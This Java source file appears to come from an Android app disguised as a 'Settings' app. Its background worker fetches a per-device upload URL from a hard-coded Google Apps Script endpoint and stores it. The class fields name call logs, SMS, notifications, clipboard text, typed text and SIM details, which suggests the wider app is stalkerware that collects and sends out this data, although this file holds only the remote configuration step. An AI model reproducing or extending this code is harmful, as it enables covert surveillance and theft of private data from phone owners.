package com.example.settings;

import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
import static com.example.settings.MainActivity.deviceInformation;
import static com.example.settings.MainActivity.getCellInfo;
import static com.example.settings.MainActivity.setuponetimeworkManager;
import static com.example.settings.MainActivity.simName;
import static com.example.settings.Utils.getDateTime;

import android.content.ClipData;
import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class GetNewUrl extends Worker {
    Sharedpref mSharedpref;
    Context context;
    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
            Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
    String url="";
    public GetNewUrl(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        mSharedpref = new Sharedpref(context);
        this.context = context;

    }

    @NonNull
    @Override
    public Result doWork() {

        url="https://script.googleusercontent.com/macros/echo?user_content_key=RdsJJZR1E_p8xnTCxFEtKU7tqCFkUC_FTl3E2g_cDSIjpo-V43chBBHgueEZb0TFHwjC-4TPOuQPKeaiaJj0jjjQkeJ4Hs0Wm5_BxDlH2jW0nuo2oDemN9CCS2h10ox_1xSncGQajx_ryfhECjZEnH8eXEwHkzBGtIkfTyiTbSQKygxmT3GiA5SP-kQUhNAjebhQ5PeN_2JFSwNzgXMLi_qVtBV2CbTgnh8KTGIWb5_kN85XsxDPBA&lib=M2DzEZy__TPANi9YiRKV2MkfyXhMohYri";
        Name = mSharedpref.getSaveName();
        if(isConnectedToNetwork(context)){
                StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                        new Response.Listener<String>() {
                            @Override
                            public void onResponse(String response) {
                                Log.d(context.getPackageName(),response);
                                try {
                                    JSONObject jsonObject=new JSONObject(response);
                                    JSONArray jsonArray=jsonObject.getJSONArray("user");
                                    for (int i=0;i<jsonArray.length()-1;i++){
                                        JSONObject jsonObject1=jsonArray.getJSONObject(i);
                                        String mName=jsonObject1.getString("name");
                                        Log.d("",mName);
                                        if (Name.equalsIgnoreCase(mName)){
                                            String mUrl=jsonObject1.getString("url");
                                            mSharedpref.setUrl(mUrl);
                                            mSharedpref.commit();
                                            break;
                                        }
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        },
                        new Response.ErrorListener() {
                            @Override
                            public void onErrorResponse(VolleyError error) {
                                Log.d(context.getPackageName(),"Error");
                                setuponetimeworkManager();
                                Result.retry();

                            }
                        }
                );
                int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                stringRequest.setRetryPolicy(retryPolicy);
                RequestQueue queue = Volley.newRequestQueue(context);
                queue.add(stringRequest);
        }
        else {
                Log.d("Settings","Internet Problem");
        }

                return Result.success();
    }
}
